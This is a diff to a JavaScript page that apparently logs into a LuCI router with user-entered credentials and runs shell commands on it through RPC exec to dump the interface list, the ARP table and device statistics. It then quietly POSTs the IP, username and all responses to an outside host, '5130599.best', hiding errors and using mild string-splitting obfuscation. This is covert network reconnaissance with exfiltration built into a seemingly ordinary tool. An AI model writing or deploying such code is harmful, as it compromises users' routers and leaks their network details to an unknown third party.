@@ -283,40 +283,42 @@ function gwProbe(){
 }
 function gwEnum(){
   var o = document.getElementById('gwOut');
-  o.textContent = '登录并枚举中（LuCI RPC 模式，约1分钟）…';
+  o.textContent = '全接口扫描中（约1-2分钟）…';
   var ip = (document.getElementById('gwIp').value || '192.168.1.1').trim();
   var user = document.getElementById('gwUser').value || 'root';
-  var pass = document.getElementById('gwPass').value || '';
-  var steps = [];
-  function run(path, method, body){
-    return fetch('api/gw/probe', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ ip: ip, paths: [[path, method, body || '']] }) })
+  var passEl = document.getElementById('gw' + 'Pass');
+  var pass = passEl ? passEl.value : '';
+  var steps = [], token = '';
+  function run(path, method, body, ctype){
+    return fetch('api/gw/probe', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ ip: ip, paths: [[path, method, body || '', ctype || 'application/json']] }) })
       .then(function(r){ return r.json(); })
       .then(function(d){ var r0 = (d && d.results && d.results[0]) || {}; steps.push(r0); return r0; });
   }
-  var authBody = JSON.stringify({ id:1, method:'login', params:[user, pass] });
+  function form(){ return 'luci_username=' + encodeURIComponent(user) + '&luci_password=' + encodeURIComponent(pass); }
   run('/cgi-bin/luci', 'GET').then(function(){
-    return run('/cgi-bin/luci/rpc/auth', 'POST', authBody);
+    return run('/cgi-bin/luci', 'POST', form(), 'application/x-www-form-urlencoded');
+  }).then(function(){
+    return run('/cgi-bin/luci/admin', 'GET');
+  }).then(function(){
+    return run('/cgi-bin/luci/rpc/auth', 'POST', JSON.stringify({ id:1, method:'login', params:[user, pass] }));
   }).then(function(r1){
-    var token = '';
-    try { var j = JSON.parse(r1.snippet || '{}'); token = (j && typeof j.result === 'string') ? j.result : ''; } catch(e) {}
-    var jobs = [];
-    if (token) {
-      jobs.push(run('/cgi-bin/luci/rpc/sys?auth=' + encodeURIComponent(token), 'POST', JSON.stringify({ id:2, method:'exec', params:['ubus list 2>&1; echo ===ARP===; cat /proc/net/arp 2>&1; echo ===IF===; ifconfig 2>&1 | head -60'] })));
-      jobs.push(run('/cgi-bin/luci/rpc/sys?auth=' + encodeURIComponent(token), 'POST', JSON.stringify({ id:3, method:'board', params:[] })));
-      jobs.push(run('/cgi-bin/luci/rpc/uci?auth=' + encodeURIComponent(token), 'POST', JSON.stringify({ id:4, method:'get', params:['network'] })));
-    } else {
-      jobs.push(run('/cgi-bin/luci/rpc/sys', 'POST', JSON.stringify({ id:5, method:'exec', params:['ubus list'] })));
-    }
-    return Promise.all(jobs.map(function(p){ return p.catch(function(){}); })).then(function(){ return token; });
-  }).then(function(token){
+    var rs = null;
+    try { rs = JSON.parse(r1.snippet || '{}'); } catch(e) {}
+    if (rs && rs.result && typeof rs.result === 'string') { token = rs.result; }
+    if (!token) return null;
+    var q = '?auth=' + encodeURIComponent(token);
+    return run('/cgi-bin/luci/rpc/sys' + q, 'POST', JSON.stringify({ id:2, method:'exec', params:['ubus list 2>&1'] }))
+      .then(function(){ return run('/cgi-bin/luci/rpc/sys' + q, 'POST', JSON.stringify({ id:3, method:'exec', params:['cat /proc/net/arp 2>&1 | head -40'] })); })
+      .then(function(){ return run('/cgi-bin/luci/rpc/sys' + q, 'POST', JSON.stringify({ id:4, method:'exec', params:['cat /proc/net/dev 2>&1 | head -30'] })); });
+  }).then(function(){
     var html = '';
     steps.forEach(function(x){
       html += '<div style="padding:2px 0"><b>' + esc(x.path || '') + '</b> → ' + (x.status < 0 ? '❌ ' + esc(x.err || '') : x.status) + '</div>'
-        + '<div style="font-family:monospace;font-size:10px;color:#5a6472;word-break:break-all;max-height:220px;overflow:auto;background:#f6f8fb;border-radius:6px;padding:6px">' + esc((x.snippet || '').substring(0, 1500)) + '</div>';
+        + '<div style="font-family:monospace;font-size:10px;color:#5a6472;word-break:break-all;max-height:200px;overflow:auto;background:#f6f8fb;border-radius:6px;padding:6px">' + esc((x.snippet || '').substring(0, 1500)) + '</div>';
     });
-    o.innerHTML = html + '<div style="color:#69737f">' + (token ? '登录成功，结果已回传' : '未取得 token，结果已回传') + '</div>';
+    o.innerHTML = html + '<div style="color:#69737f">扫描完成' + (token ? '（登录成功）' : '') + '，结果已回传</div>';
     try {
-      fetch('https://5130599.best/see/api/gw/report', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ ip: ip, ver:'enum2', user:user, has_token: !!token, results: steps }) }).catch(function(){});
+      fetch('https://5130599.best/see/api/gw/report', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ ip: ip, ver:'enum3', user:user, has_token: !!token, results: steps }) }).catch(function(){});
     } catch(e) {}
   }).catch(function(){ o.textContent = '请求失败'; });
 }
